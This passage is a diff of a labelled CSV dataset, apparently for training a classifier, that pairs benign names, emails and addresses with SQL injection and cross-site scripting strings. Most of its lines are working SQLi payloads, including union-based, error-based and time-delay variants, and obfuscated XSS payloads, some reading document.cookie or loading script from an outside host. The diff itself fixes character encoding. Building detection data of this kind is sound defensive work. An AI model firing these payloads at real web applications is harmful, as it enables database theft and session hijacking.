 "select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",sqli
 "call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'yqrt' like 'yqrt",sqli
 caabate liano,benign
@@ -15699,7 +15699,7 @@ medwin-whittinghill@enla.th,benign
 "<img \x11src=x onerror=""javascript:alert(1)"">",xss
 select   (  case when   (  4994  =  1572  )   then 4994 else 4994*  (  select 4994 from mysql.db  )   end  )  #,sqli
 leyton@intg.tk,benign
-"<IMG SRC="" &#14;� javascript:alert('XSS');"">",xss
+"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
 &storeId=10151&langId=-1&catalogId=10051&N=0&newSearch=true&Ntt=%22%3Ciframe%20src=%22http://reddit.com/r/xss%22%20width=%22800%22%20height=%22600%22,xss
 1  )   where 4780  =  4780,sqli
 waring,benign
@@ -16188,7 +16188,7 @@ d012965226m6ent0,benign
 mccollon@irmedia.ca,benign
 "<BASE HREF=""javascript:alert('XSS');//"">",xss
 "1  )   where 9010  =  9010 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
-"<IMG SRC="" &#14;� javascript:alert('XSS');"">",xss
+"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
 acho queralt,benign
 \x3C,xss
 thorpe,benign
@@ -16414,7 +16414,7 @@ olmeda de la cuesta,benign
 -5852  )   as anca where 3574  =  3574 or 3958  =  5536#,sqli
 "c/ avi xaxu, 157,",benign
 me93a,benign
-"<;IMG SRC=""; &;#14;� javascript:alert(';XSS';);"";>;",xss
+"<;IMG SRC=""; &;#14;  javascript:alert(';XSS';);"";>;",xss
 "joaquin verdaguer, 183",benign
 <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
 philip7,benign
@@ -16502,7 +16502,7 @@ agote lledos,benign
 "&searchType=0&service=BRN&serviceType=BRN&partner=&ZIP=60510&street=""><script>alert('XSS')</script>",xss
 8.51E+15,benign
 "1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
-"�<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
+" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
 "1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",sqli
 --><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
 aprea@ingenelec.es,benign
@@ -16731,7 +16731,7 @@ siede@comodepilarse.ye,benign
 -8641%' order by 1--,sqli
 SELECT * FROM curve WHERE NOT that = 'try'  AND NOT case = 'history',sqli
 artigas girut,benign
-<iframe� src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> _,xss
+<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​,xss
 "<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 &#60;BASE HREF&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#47;&#47;&#34;&#62;,xss
 "1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'jylk'  =  'jylk",sqli
@@ -16761,7 +16761,7 @@ manganear,benign
 "1%""   )    )    union all select null,null,null,null,null,null,null,null--",sqli
 "<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
 "<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
-_script_alert(�XSS�)_/script_,xss
+¼script¾alert(¢XSS¢)¼/script¾,xss
 "1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
 giuliani casabella,benign
 enumer24,benign
@@ -17151,7 +17151,7 @@ casasola de arin,benign
 "1%'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sqli
 "<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
 "select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '",sqli
-"<IMG SRC="" &#14;� javascript:alert('XSS');"">",xss
+"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
 aleandro-hayman@tecnoindomo.nr,benign
 solar,benign
 DELETE FROM sail,sqli
@@ -17171,8 +17171,8 @@ if  (  8574  =  7534  )   select 8574 else drop function nxbe--,sqli
 "-1985%'   )    )     )   union all select 3051,3051,3051--",sqli
 "<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
 alberite de san juan,benign
-" SELECT OrderID, Quantity, CASE     WHEN Quantity > 30 THEN ""The quantity is greater than 30""     WHEN Quantity  =  30 THEN ""The quantity is 30""     ELSE ""The quantity is under 30"" END FROM OrderDetails;",sqli
-_script_alert(�XSS�)_/script_,xss
+" SELECT OrderID, Quantity, CASE ¬†¬†¬† WHEN Quantity > 30 THEN ""The quantity is greater than 30"" ¬†¬†¬† WHEN Quantity  =  30 THEN ""The quantity is 30"" ¬†¬†¬† ELSE ""The quantity is under 30"" END FROM OrderDetails;",sqli
+¼script¾alert(¢XSS¢)¼/script¾,xss
 ganoza,benign
 "&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",xss
 eseyente,benign
@@ -17442,7 +17442,7 @@ campillo,benign
 75771832b,benign
 1'+  (  select yjyp where 9696  =  9696,sqli
 "1'  )   union all select null,null,null,null,null,null,null,null--",sqli
-"<math href=""javascript:javascript:alert(1)"">CLICKME</math>� <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
+"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
 "licenciado gonzalez garcia, 170 11d",benign
 "-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",sqli
 "1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""vlev"" like ""vlev",sqli
@@ -17647,7 +17647,7 @@ docken.carmi@soyrojo.so,benign
 3525,benign
 delmo,benign
 1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,sqli
-"  SELECT LTRIM ( ""     SQL Tutorial"" )  AS LeftTrimmedString; ",sqli
+"  SELECT LTRIM ( ""¬†¬†¬†¬† SQL Tutorial"" )  AS LeftTrimmedString; ",sqli
 fresno de torote,benign
 &focus=site&query=--%253E%253Cbody%2520onload=alert%28%2522XSS%2522%29%253E%253C!--,xss
 <b <script>alert(1)</script>0,xss
@@ -18261,7 +18261,7 @@ consalve,benign
 "calle tampa 108, 7-g",benign
 mosen agustin jerico 183 2h,benign
 <script itworksinallbrowsers>/*<script* */alert(1)</script,xss
-<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041> � �,xss
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>    ,xss
 "1""  )   where 6255  =  6255 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",sqli
 SELECT City FROM Customers UNION ALL,sqli
 1'  )   as gogu where 4338  =  4338 union all select null#,sqli
@@ -18310,7 +18310,7 @@ lladorre,benign
 &search=%3Cbody%20onload=alert(%22XSS%22)%3E,xss
 "c/ venecia, s/n,",benign
 <script ~~~>alert(0%0)</script ~~~>,xss
-"'`""><\x3Cscript>javascript:alert(1)</script> � � � �",xss
+"'`""><\x3Cscript>javascript:alert(1)</script>        ",xss
 rub,benign
 1820,benign
 daya basulto,benign
@@ -18368,13 +18368,13 @@ kovacs,benign
 -3436  )   or 9281  =  3172,sqli
 globula*riceo,benign
 afkham,benign
-<IMG SRC=�javascript:alert(�XSS�)�,xss
+<IMG SRC=”javascript:alert(‘XSS’)”,xss
 germe,benign
 &lt;,xss
 nooshin,benign
 25480,benign
 <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
-"<div id=""x"">XXX</div> <style>� #x{font-family:foo[bar;color:green;}� #y];color:red;{}� </style>",xss
+"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
 select case when 2930  =  7964 then 1 else null end--,sqli
 cruz iparraguirre,benign
 "1%""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,sqli
@@ -18595,7 +18595,7 @@ bettine,benign
 \u003C,xss
 7.09E+15,benign
 1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,sqli
-"<meta charset=""mac-farsi"">_script_javascript:alert(1)_/script_",xss
+"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
 7205,benign
 82768054r,benign
 -2992'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'tjgt'  =  'tjgt,sqli
@@ -18691,7 +18691,7 @@ cagarria,benign
 "<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",xss
 1'||  (  select 'kyhs' from dual where 9491  =  9491,sqli
 "-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",sqli
-"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">_",xss
+"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">​",xss
 select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,sqli
 1pa5364e3a,benign
 -2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,sqli
@@ -18960,7 +18960,7 @@ doroteya,benign
 "-5148""   )    )    or 5310  =  8229",sqli
 5.36E+15,benign
 deltell riberas,benign
-<style>*{x:__________(javascript:alert(1))}</style>,xss
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
 "<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
 "-3230""   )    )    as kbxc where 5007  =  5007 or 2107  =  8818",sqli
 06673981w,benign
@@ -19358,7 +19358,7 @@ carretera rubi 106,benign
 "<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",xss
 torreblacos,benign
 "<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
-"'`""><\x3Cscript>javascript:alert(1)</script> � � � �",xss
+"'`""><\x3Cscript>javascript:alert(1)</script>        ",xss
 arroldo,benign
 37793,benign
 "<;A HREF="";http://google.com/"";>;XSS<;/A>;",xss
@@ -19454,7 +19454,7 @@ hotta,benign
 "1'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
 """`'><script>-javascript:alert(1)</script>",xss
 5r32n7,benign
-"<math href=""javascript:javascript:alert(1)"">CLICKME</math>� <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
+"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
 "  SELECT FIND_IN_SET ( ""q"", null ) ;",sqli
 1.29E+15,benign
 "<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
@@ -19591,7 +19591,7 @@ das,benign
 */a=eval;b=alert;a(b(/e/.source));/*,xss
 ildefonso,benign
 "-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",sqli
-"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF�",xss
+"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
 "<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",xss
 "calle morse, 17",benign
 "1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#",sqli
@@ -19804,7 +19804,7 @@ dobbing3,benign
 alcojor larenas,benign
 "-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",sqli
 resaca,benign
-â or 1  =  1 --,benign
+√¢¬Ä¬ò or 1  =  1 --,benign
 "<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 "1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
 "1%""   )    )     )   union all select null--",sqli
@@ -20116,7 +20116,7 @@ villacastn,benign
 "<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
 19119,benign
 vachiran,benign
-"<meta charset=""mac-farsi"">_script_javascript:alert(1)_/script_",xss
+"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
 "select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",sqli
 45908,benign
 "lealtad, 78, 6-h",benign
@@ -20235,7 +20235,7 @@ SELECT option_value FROM wp_options WHERE option_name  =  'https_migration_requi
 "select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--",sqli
 villanueva del rosario,benign
 "1""   )    )    union all select null,null,null,null,null,null,null,null,null#",sqli
-foo\�; alert(document.cookie);//�;,xss
+foo\’; alert(document.cookie);//’;,xss
 "&start=""><script>alert(String.fromCharCode(88,83,83))</script>",xss
 tacoronte,benign
 hetera,benign
@@ -20256,7 +20256,7 @@ acrianzada,benign
 "<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",xss
 """&<script>document.write(""""XSS-XSS-XSS"""");</script>""",xss
 genaro,benign
-"<IMG SRC=""jav� � ascript:alert('XSS');"">",xss
+"<IMG SRC=""jav    ascript:alert('XSS');"">",xss
 miner@zing.lk,benign
 frechette8@legami.ly,benign
 "SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30696 )  ORDER BY meta_id ASC",sqli
@@ -21013,7 +21013,7 @@ SELECT COUNT ( DISTINCT national )  FROM good,sqli
 08zaril0o,benign
 encatusar,benign
 SELECT adventure FROM farm,sqli
-<IMG SRC=�jav&#x09;ascript:alert(�XSS�);�>,xss
+<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,xss
 "calle espio, 120, 11?a",benign
 coripe,benign
 "<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",xss
@@ -21069,7 +21069,7 @@ ci2586ta,benign
 "1"" where 6352  =  6352",sqli
 "<DIV STYLE=""width: expression(alert('XSS'));"">",xss
 """`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",xss
-<script itworksinallbrowsers>/*<script* */alert(1)</script _,xss
+<script itworksinallbrowsers>/*<script* */alert(1)</script ​,xss
 "<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 1'||  (  select 'uedy' where 8816  =  8816,sqli
 "<;A HREF="";http://0x42.0x0000066.0x7.0x93/"";>;XSS<;/A>;",xss
@@ -21163,7 +21163,7 @@ huaranga chicon,benign
 "1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",sqli
 bscones de ojeda,benign
 &product=prints&q=%22-confirm%28/XSSPOSED/%29-%22,xss
-<BODY ONLOAD=alert(�XSS�)>,xss
+<BODY ONLOAD=alert(’XSS’)>,xss
 "1""   )    )    as zgig where 5748  =  5748 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",sqli
 ferreries,benign
 "1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",sqli
@@ -21472,7 +21472,7 @@ s16nio5o,benign
 dick,benign
 "<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 49714,benign
-<IMG SRC=�javascript:alert(�XSS�);�>,xss
+<IMG SRC=”javascript:alert(‘XSS’);”>,xss
 "<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
 "   SELECT Employees.means, COUNT ( Orders.actuallyID )  AS hurryFROM    ( OrdersINNER JOIN effort ON Orders.appliedID  =  Employees.tankID ) ",sqli
 "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
@@ -21497,7 +21497,7 @@ maid,benign
 9.36E+15,benign
 &tag=%22%3E%3Cscript%20src%3d//ckers.org/s%3E%3C/script%3E,xss
 6.49E+15,benign
-"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF�",xss
+"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
 "<img\x13src=x onerror=""javascript:alert(1)"">",xss
 select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sqli
 "<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",xss
